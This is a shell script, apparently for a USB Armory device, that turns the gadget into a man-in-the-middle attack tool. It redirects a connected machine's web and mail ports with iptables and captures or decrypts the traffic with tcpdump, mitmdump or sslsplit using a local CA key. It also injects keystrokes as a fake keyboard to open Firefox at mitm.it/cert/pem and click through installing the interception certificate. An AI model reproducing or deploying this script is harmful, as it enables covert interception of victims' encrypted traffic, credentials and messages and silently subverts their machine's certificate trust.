#!/bin/sh
#set -x
#set -e

export p2p=/home/usbarmory/String2Hid
export hid=/dev/hidg0
export lang=de
export delay=0.1

#=========== CONFIGS ==================
# Sniff-Prog:
# 0 = no sniff
# 1 = tcpdump
# 2 = mitmproxy
# 3 = sslsplit Not working automatic! (TODO: Fix problem with run as daemon in background!)

export sniffprog=0
#--------------------------------------
# Certificate:
# 0 = install no certificate
# 1 = install certificate

export cert=0
#-------------------------------------
# Browser: TODO: Define more Browsers!
# 1 = Firefox

export browser=1
#=======================================

FILECOUNT=$(find /home/usbarmory/SniffedFiles/ -type f | wc -l)

if [ "$sniffprog" -eq 1 ]; then
	# Start tcpdump only HTTP!
	sudo tcpdump -p -s0 -w /home/usbarmory/SniffedFiles/tcpdump-$FILECOUNT.dump &
elif [ "$sniffprog" -eq 2 ]; then
	sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 8080
	sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j REDIRECT --to-port 8080

	sleep 4

	# Start mitmdump for HTTP/HTTPS
	mitmdump -T --host -q -w /home/usbarmory/SniffedFiles/mitmdump-$FILECOUNT &
elif [ "$sniffprog" -eq 3 ]; then
	# most common ports	
	sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
	sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
	sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
	sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
	sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
	# additional ports
	# WhatsApp:	
	#sudo iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080

	sleep 4

	./sslsplit -D -l /home/usbarmory/SniffedFiles/sslsplit-$FILECOUNT.log -j /home/usbarmory/SniffedFiles/sslsplit/ -S logdir/ -k /home/usbarmory/certificate/ca-key.pem -c /home/usbarmory/certificate/ca-root.pem ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 &
fi


# Certificate
if [ "$cert" -eq 1 ]; then

	sleep 8
	$p2p "\\\"\c\at\\\"" $lang
	sleep 2

	$p2p "firefox http://mitm.it/cert/pem\\n" $lang
	sleep 2
	$p2p " " $lang
	sleep $delay
	$p2p "\t" $lang
	sleep $delay
	$p2p " " $lang
	sleep $delay
	$p2p "\t" $lang
	sleep $delay
	$p2p " " $lang
	sleep $delay
	$p2p "\t" $lang
	sleep $delay
	$p2p "\t" $lang
	sleep $delay
	$p2p "\t" $lang
	sleep $delay
	$p2p "\n" $lang
	sleep $delay
	$p2p "\\\"\cq\\\"" $lang
	sleep 1
	$p2p "exit\\n" $lang
fi
